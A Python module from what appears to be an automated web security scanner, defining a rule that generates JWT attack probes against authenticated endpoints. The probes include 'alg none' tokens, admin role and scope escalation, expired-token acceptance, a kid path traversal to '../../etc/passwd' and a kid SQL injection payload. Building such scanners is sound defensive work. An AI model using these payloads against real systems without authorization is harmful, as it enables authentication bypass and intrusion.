from __future__ import annotations

import json

from execution_plane.planner.rules.base import AssetMap, AttackRule, ScanContext
from storage.db.models import AttackTask, Endpoint


class JwtAttack(AttackRule):
    requires_auth = True
    attack_class = "jwt_attack"
    name = "JwtAttack"

    def matches(self, endpoint: Endpoint, asset_map: AssetMap) -> bool:
        del asset_map
        return endpoint.auth_required

    def generate_tasks(self, endpoint: Endpoint, context: ScanContext) -> list[AttackTask]:
        hypotheses: list[dict[str, object]] = [
            {
                "probe_type": "alg_none",
                "mutation": {
                    "headers": {
                        "Authorization": "Bearer <alg_none_token>",
                    },
                    "jwt_mutation": {
                        "alg": "none",
                        "signature": "",
                    },
                },
            },
            {
                "probe_type": "claim_escalation_role",
                "mutation": {
                    "headers": {
                        "Authorization": "Bearer <mutated>",
                    },
                    "jwt_mutation": {
                        "payload_overrides": {
                            "role": "admin",
                        }
                    },
                },
            },
            {
                "probe_type": "claim_escalation_scope",
                "mutation": {
                    "headers": {
                        "Authorization": "Bearer <mutated>",
                    },
                    "jwt_mutation": {
                        "payload_overrides": {
                            "scope": "admin read:all",
                        }
                    },
                },
            },
            {
                "probe_type": "expired_token_acceptance",
                "mutation": {
                    "headers": {
                        "Authorization": "Bearer <expired>",
                    },
                    "jwt_mutation": {
                        "payload_overrides": {
                            "exp": 1000000000,
                        }
                    },
                },
            },
            {
                "probe_type": "kid_path_traversal",
                "mutation": {
                    "headers": {
                        "Authorization": "Bearer <kid_mutated>",
                    },
                    "jwt_mutation": {
                        "header_overrides": {
                            "kid": "../../etc/passwd",
                        }
                    },
                },
            },
            {
                "probe_type": "kid_sql_injection",
                "mutation": {
                    "headers": {
                        "Authorization": "Bearer <kid_mutated>",
                    },
                    "jwt_mutation": {
                        "header_overrides": {
                            "kid": "' OR 1=1--",
                        }
                    },
                },
            },
        ]

        tasks: list[AttackTask] = []
        for hypothesis in hypotheses:
            tasks.append(
                AttackTask(
                    scan_id=context.scan_id,
                    endpoint_id=endpoint.id,
                    attack_class=self.attack_class,
                    target_parameter="Authorization",
                    hypothesis=json.dumps(hypothesis, sort_keys=True),
                )
            )
        return tasks

    def expected_proof_signal(self) -> str:
        return "JWT manipulation bypasses server authentication or server accepts mutated claims"
